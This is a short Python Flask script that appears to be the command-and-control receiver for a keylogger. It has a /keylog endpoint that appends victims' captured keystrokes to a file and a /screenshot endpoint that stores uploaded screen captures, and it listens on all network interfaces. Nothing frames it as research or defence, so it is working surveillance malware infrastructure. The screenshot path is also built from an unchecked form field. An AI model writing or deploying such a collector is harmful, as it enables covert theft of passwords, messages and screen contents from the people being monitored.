from flask import Flask, request

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    with open("received_keylog.txt", "a") as f:
        f.write(data['keystrokes'] + "\n")
    return "Keylog received", 200

@app.route('/screenshot', methods=['POST'])
def receive_screenshot():
    file = request.files['screenshot']
    file.save(f"./screenshots/screenshot_{request.form['timestamp']}.png")
    return "Screenshot received", 200

@app.route('/test', methods=['GET'])
def test():
    return 'test', 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  
